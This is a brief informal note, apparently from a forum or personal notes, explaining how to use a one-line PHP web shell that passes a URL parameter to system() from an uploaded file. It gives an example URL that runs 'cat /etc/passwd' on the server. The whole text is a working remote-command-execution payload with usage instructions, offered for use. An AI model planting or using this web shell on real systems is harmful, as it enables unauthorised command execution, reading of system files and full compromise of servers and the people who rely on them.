

when using the script 

``` php
(php opening tag) 

system($_GET['cmd']);

(php close tag)
```
(cant do actual tags or note gets deleted)

and you load the page containg script

E.G:

`example.com/upload/images/file.php`

you MUST include the peramiter in the URL 

`example.com/upload/images/file.php?cmd=cat /etc/passwd`

 